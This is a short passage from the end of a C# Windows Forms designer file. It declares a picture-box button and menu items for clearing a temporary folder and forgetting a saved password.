        public System.Windows.Forms.PictureBox goButton;
        private System.Windows.Forms.ToolStripMenuItem clearTemporaryFolderToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem forgetPasswordToolStripMenuItem;
    }
}